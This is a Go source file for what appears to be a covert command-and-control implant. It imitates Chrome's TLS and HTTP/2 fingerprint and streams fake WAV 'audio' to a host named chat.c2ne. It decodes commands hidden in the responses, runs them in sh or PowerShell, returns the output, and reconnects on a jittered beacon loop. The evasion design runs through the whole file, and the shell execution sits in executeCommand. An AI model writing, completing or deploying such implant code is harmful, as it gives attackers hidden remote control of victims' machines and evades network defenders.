package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"time"
	"sync"
	"runtime"
	"os/exec"
	"strings"
	"os"
	"context"
	"math/rand"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

var	baseAudioTrack []byte

func dialH2()(*http2.ClientConn, error){

	tcpConn, err := net.Dial("tcp", "127.0.0.1:443")
	if err != nil {
		fmt.Println("tcp dial:", err)
		return nil, err
	}

	//uTLS with h2 ALPN
	config := &utls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		ServerName:         "localhost",
	}
	uConn := utls.UClient(tcpConn, config, utls.HelloChrome_Auto)

	if err := uConn.Handshake(); err != nil {
		fmt.Println("utls handshake:", err)
		return nil, err
	}

	//verify h2 negotiation from server
	if uConn.ConnectionState().NegotiatedProtocol != "h2" {
		fmt.Println("h2 not negotiated, got:",
			uConn.ConnectionState().NegotiatedProtocol)
		return nil, nil //need an err here
	}
	fmt.Println("client: h2 negotiated via uTLS")

	//http2 transport over uTLS conn
	transport := &http2.Transport{
		ChromeCompatConfig: http2.ChromeCompatConfig{Enabled: true},
	}
	//transport := &http2.Transport{}
	clientConn, err := transport.NewClientConn(uConn)
	if err != nil {
		fmt.Println("http2 NewClientConn:", err)
		return nil, err
	}

	return clientConn, nil
}

func startAudioCall(clientConn *http2.ClientConn){
	baseAudioTrack, _ = os.ReadFile("sample.wav")
	//if err != nil{
	//	fmt.Println("not in location file:", filename)
	//}
	index :=0
	ChunkSize := 640 //per 20 ms
	totalTrackBytes := len(baseAudioTrack)
	byteOffset :=0
	/*if index==0{
		byteOffset+= int(h.DataStart) //TODO if it is the first chunk, dont include header in the chunk
	}*/

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	pr, pw := io.Pipe()
	dataReceived := make(chan struct{}, 1)	//monitors data silence
	commandReceived := make(chan struct{}, 1)	//monitors command silence
	req, err := http.NewRequestWithContext(ctx, "POST", "https://chat.c2ne:443/call", pr)
	if err != nil {
		log.Fatal("new request:", err)
	}

	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36")
	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-encoding", "gzip, deflate, br, zstd")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("content-type", "audio/wav")
	req.Header.Set("priority", "u=1, i")

	// RoundTrip sends request headers and returns once response headers arrive
	// pr keeps streaming request body data to server after this returns
	resp, err := clientConn.RoundTrip(req)
	if err != nil {
		log.Fatal("roundtrip:", err)
	}
	fmt.Println("client: connected, proto:", resp.Proto)

	var wg sync.WaitGroup

	wg.Go(func(){ //watcher
		defer fmt.Println("debug 1 done")
		dataTimer := time.NewTimer(10* time.Second)
		commandTimer := time.NewTimer(60* time.Second)
		defer dataTimer.Stop()
		defer commandTimer.Stop()

		for{
			select{
			case <-ctx.Done(): //connection closed
				return
			case <- dataReceived:
				//data arrived, reset the data slience timer
				resetTimer(dataTimer, 10* time.Second)
			case <- commandReceived:
				//command arrived, reset command silence timer
				resetTimer(commandTimer, 60* time.Second)
			case <- dataTimer.C:
				//no data recieved for 10 secs
				fmt.Println("No data for 10s, sleeping for a min or so")
				cancel()
				pw.Close()
				return
			case <- commandTimer.C:
				//no commands for 60 seconds
				fmt.Println("no commads for over a minute, napping")
				cancel()
				pw.Close()
				return
			}
		}
	})

	// write a chunk of bytes every 20ms via pw
	wg.Go(func() {
		defer fmt.Println("debug 2 done")
		defer pw.Close() // closing pw sends EOF to server's r.Body
		ticker := time.NewTicker(20 * time.Millisecond)
		defer ticker.Stop()
		for {
			select{ //need case for when server closes conn
			case <- ctx.Done():
				return
			case <-ticker.C:
				num:=0
				chunk := make([]byte, ChunkSize)
				byteOffset = index*ChunkSize //TODO logic to set header byteoffset, if index=0
				if byteOffset+ChunkSize > totalTrackBytes {
					num =copy(chunk, baseAudioTrack[byteOffset:totalTrackBytes])
					index=0
				}else{
					num =copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
				}
				encodedChunk := encodingEngine(chunk, num)
				//fmt.Println("enc len ", len(encodedChunk))
				pw.Write(encodedChunk)
				index++
			}
		}
	})

	//read HELLO from server via resp.Body (blocks until server writes)
	wg.Go(func() {
		defer fmt.Println("debug 3 done")
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		for {
			n, err := resp.Body.Read(buf)
			if n > 0 {
				//we recieved data, signal same to the previous go func
				select{
				case dataReceived <- struct{}{}:
				default:
				}

				cmd, isFullCmd := decoderEngine(buf[:n]) //might need to catch isFullCmd
				if isFullCmd=="true" && cmd!=""{		//||isFullCmd=="none"{
					//signal to previous go func that we recieved a command
					select{
					case commandReceived <- struct{}{}:		//basically just send a signal, without any data
					default:
					}
					executeCommand(cmd)
				}/*else{
					fmt.Println("full command recieved = ", isFullCmd)
				}*/
			}
			if err != nil {
				return
			}
		}
	})
	wg.Wait()
	return
}

// timer reset helper — Go's timer reset idiom --generated by AI
func resetTimer(t *time.Timer, d time.Duration) {
    if !t.Stop() {
        select {
        case <-t.C:
        default:
        }
    }
    t.Reset(d)
}

var targetDir string
func executeCommand(finalCommand string){
	if len(finalCommand)!=0{
		shellBinary := "sh"
		shellFlag := "-c"
		var formatted_out string
		
		if runtime.GOOS == "windows"{
			shellBinary = "powershell"
			shellFlag = "/C"
		}

		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
		args := strings.Fields(finalCommand)
		switch args[0]{
		case "cd":
			targetDir ="/"
			if len(args)>1{
				if targetDir == "../"||targetDir == "../../"{ //TODO -- write a better logic, like OS.chdir or somtn
					targetDir = targetDir+args[1]
				}
				targetDir=args[1]
			}
		}
		//validate targetDir
		cmd.Dir = targetDir //either this, or os.Chdir, but we would need os.Stat and os.isDir or something for that
		res, err := cmd.Output()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
        		formatted_out = fmt.Sprintf("%s", string(exitErr.Stderr))
    		}else{
    			formatted_out = "unknown error for " + finalCommand
    		}
		}else{
			formatted_out = strings.TrimSpace(string(res))
		}

		//fmt.Println("formatted_out = ", formatted_out)
		//fmt.Println("output length - ", len(formatted_out)) 
		cliMessageChan <- formatted_out
	}
}

func main() {
	
	if echo_to_stdout=="true"{
		testFingerprint()
	}
	for{

		clientConn, err := dialH2()
		if err!=nil{
			fmt.Println("Dial error", err)
		}else{
			startAudioCall(clientConn)
			clientConn.Close()
			fmt.Println("Closing conn")
		}

		jitter := time.Duration(60+rand.Intn(31))* time.Second
		fmt.Println("Napping for ", jitter)
		time.Sleep(jitter)
		fmt.Println("Woke up")
	}
}

func testFingerprint() {	//generated by AI
    // dial tls.peet.ws directly
    tcpConn, err := net.Dial("tcp", "tls.peet.ws:443")
    if err != nil {
        fmt.Println("dial error:", err)
        return
    }

    uConn := utls.UClient(tcpConn, &utls.Config{
        InsecureSkipVerify: false,  // real cert this time
        NextProtos:         []string{"h2"},
        ServerName:         "tls.peet.ws",
    }, utls.HelloChrome_Auto)

    if err := uConn.Handshake(); err != nil {
        fmt.Println("handshake error:", err)
        return
    }

    transport := &http2.Transport{
        ChromeCompatConfig: http2.ChromeCompatConfig{Enabled: true},
    }
    clientConn, err := transport.NewClientConn(uConn)
    if err != nil {
        fmt.Println("http2 error:", err)
        return
    }

    req, _ := http.NewRequest("GET", "https://tls.peet.ws/api/all", nil)
    req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36")
    req.Header.Set("accept", "*/*")
    req.Header.Set("accept-encoding", "gzip, deflate, br, zstd")
    req.Header.Set("accept-language", "en-US,en;q=0.9")
    req.Header.Set("priority", "u=1, i")

    resp, err := clientConn.RoundTrip(req)
    if err != nil {
        fmt.Println("roundtrip error:", err)
        return
    }
    defer resp.Body.Close()

    body, _ := io.ReadAll(resp.Body)
    fmt.Println(string(body))
}